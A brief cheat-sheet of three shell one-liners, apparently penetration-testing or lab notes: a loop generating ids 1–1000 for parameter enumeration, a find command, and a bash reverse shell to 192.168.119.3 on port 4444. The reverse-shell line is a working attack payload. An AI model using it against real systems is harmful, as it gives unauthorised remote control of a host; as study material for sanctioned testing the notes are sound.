
`for i in $(seq 1 1000); do echo $i >> ids.txt; done` - generates value of id parameter 1-1000

`bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` - utilize to get a reverse shell

`find / -name "readme" 2>/dev/null` - locate a folder and print the location of the folder